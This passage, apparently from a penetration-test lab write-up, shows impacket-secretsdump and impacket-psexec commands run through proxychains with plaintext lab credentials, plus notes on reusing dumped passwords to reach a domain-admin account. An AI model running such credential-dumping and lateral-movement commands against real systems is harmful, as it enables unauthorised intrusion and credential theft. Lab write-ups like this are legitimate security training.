Leveraging the credentials obtained from the previous dump
```
proxychains impacket-secretsdump lab.exam/tom.green:Bl@ck3@rthJ1g5@w@172.16.105.102 -dc-ip 172.16.105.100

One of the credential information that I obtained is talking about default secret password and since I
saw the user tom.green in the previous target, I instinctively tried this approach from the beginning

Pentester used the credential obtained from the latest dump to gain access to the second target via psexec

# .105.100

Pentester once again noticed that the latest dump results included the user ‘nicola pitch’, who according to the bloodhound output is a member of domain admin group
```
proxychains impacket-psexec lab.exam/nicola.pitch:Wh1t3Sp@cePuzzl3@172.16.105.100
